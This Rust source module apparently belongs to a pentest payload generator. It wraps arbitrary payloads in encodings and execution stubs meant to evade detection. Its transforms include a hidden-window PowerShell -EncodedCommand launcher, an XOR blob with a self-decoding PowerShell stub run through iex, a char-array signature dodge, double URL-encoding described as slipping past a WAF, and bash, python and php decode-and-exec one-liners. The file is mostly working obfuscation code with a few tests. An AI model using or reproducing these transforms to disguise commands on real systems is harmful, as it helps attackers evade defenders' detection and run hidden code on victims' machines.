//! Encoding & obfuscation transforms applied to a rendered payload. These are the
//! standard pentest-curriculum transforms (base64, UTF-16LE PS EncodedCommand,
//! XOR, hex, URL-encode, char-array). They defeat naive signature matching and
//! solve delivery/quoting problems; they do not defeat behavioural detection.

use base64::Engine;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Kind {
    /// Standard base64 of the raw payload bytes.
    Base64,
    /// PowerShell -EncodedCommand: UTF-16LE then base64. Ready to run with
    /// `powershell -enc <blob>`.
    PsEncodedCommand,
    /// Hex string (\xNN not applied; raw hex).
    Hex,
    /// Percent-encoding for URL/web delivery.
    UrlEncode,
    /// Double URL-encoding to slip through a decoding filter.
    DoubleUrlEncode,
    /// Single-byte XOR + a self-decoding PowerShell stub.
    XorPsStub,
    /// Split into a PowerShell char-array and -join it back.
    PsCharArray,
    /// base64 wrapped in a bash decode-and-exec one-liner.
    BashB64Exec,
    /// base64 wrapped in a python decode-and-exec one-liner.
    PyB64Exec,
    /// base64 wrapped in a php eval(base64_decode()) one-liner.
    PhpB64Eval,
}

impl Kind {
    pub fn label(self) -> &'static str {
        use Kind::*;
        match self {
            Base64 => "base64",
            PsEncodedCommand => "ps-encodedcommand",
            Hex => "hex",
            UrlEncode => "url-encode",
            DoubleUrlEncode => "double-url-encode",
            XorPsStub => "xor-ps-stub",
            PsCharArray => "ps-char-array",
            BashB64Exec => "bash-b64-exec",
            PyB64Exec => "py-b64-exec",
            PhpB64Eval => "php-b64-eval",
        }
    }

    pub fn describe(self) -> &'static str {
        use Kind::*;
        match self {
            Base64 => "base64-encode the raw payload",
            PsEncodedCommand => "UTF-16LE + base64 for `powershell -enc` (bypasses quoting hell)",
            Hex => "hex-encode the bytes",
            UrlEncode => "percent-encode for URL/web delivery",
            DoubleUrlEncode => "double percent-encode to slip past a decoding WAF/filter",
            XorPsStub => "single-byte XOR with a self-decoding PowerShell stub",
            PsCharArray => "PowerShell [char[]] array reassembled with -join",
            BashB64Exec => "base64 wrapped in `echo … | base64 -d | bash`",
            PyB64Exec => "base64 wrapped in a python exec() decoder",
            PhpB64Eval => "base64 wrapped in `eval(base64_decode())`",
        }
    }
}

const B64: base64::engine::general_purpose::GeneralPurpose =
    base64::engine::general_purpose::STANDARD;

pub fn apply(kind: Kind, input: &str) -> String {
    match kind {
        Kind::Base64 => B64.encode(input.as_bytes()),
        Kind::PsEncodedCommand => {
            // UTF-16LE, then base64. This is exactly what `powershell -enc` expects.
            let utf16: Vec<u8> = input.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
            let blob = B64.encode(&utf16);
            format!("powershell -nop -w hidden -enc {blob}")
        }
        Kind::Hex => input
            .as_bytes()
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect(),
        Kind::UrlEncode => url_encode(input),
        Kind::DoubleUrlEncode => url_encode(&url_encode(input)),
        Kind::XorPsStub => xor_ps_stub(input, 0xAA),
        Kind::PsCharArray => ps_char_array(input),
        Kind::BashB64Exec => {
            let b = B64.encode(input.as_bytes());
            format!("echo {b} | base64 -d | bash")
        }
        Kind::PyB64Exec => {
            let b = B64.encode(input.as_bytes());
            format!("python3 -c \"import base64;exec(base64.b64decode('{b}'))\"")
        }
        Kind::PhpB64Eval => {
            let b = B64.encode(input.as_bytes());
            format!("php -r \"eval(base64_decode('{b}'));\"")
        }
    }
}

fn url_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// XOR each byte with `key`, base64 the result, and prepend a PowerShell stub that
/// decodes and executes it in memory.
fn xor_ps_stub(input: &str, key: u8) -> String {
    let xored: Vec<u8> = input.bytes().map(|b| b ^ key).collect();
    let blob = B64.encode(&xored);
    format!(
        "$k={key};$d=[Convert]::FromBase64String('{blob}');\
         $p=-join($d|%{{[char]($_ -bxor $k)}});iex $p"
    )
}

/// Break the payload into a `[char[]]` array joined back together — a classic
/// string-signature dodge for PowerShell.
fn ps_char_array(input: &str) -> String {
    let codes: Vec<String> = input.chars().map(|c| (c as u32).to_string()).collect();
    format!("$s=[char[]]({}) -join '';iex $s", codes.join(","))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ps_encodedcommand_roundtrips() {
        let out = apply(Kind::PsEncodedCommand, "whoami");
        let blob = out.rsplit(' ').next().unwrap();
        let raw = B64.decode(blob).unwrap();
        // Decode UTF-16LE back.
        let u16s: Vec<u16> = raw
            .chunks(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        assert_eq!(String::from_utf16(&u16s).unwrap(), "whoami");
    }

    #[test]
    fn base64_and_url() {
        assert_eq!(apply(Kind::Base64, "AB"), "QUI=");
        assert_eq!(apply(Kind::UrlEncode, "a b&c"), "a%20b%26c");
        assert_eq!(apply(Kind::DoubleUrlEncode, " "), "%2520");
    }

    #[test]
    fn hex_encodes() {
        assert_eq!(apply(Kind::Hex, "AZ"), "415a");
    }
}
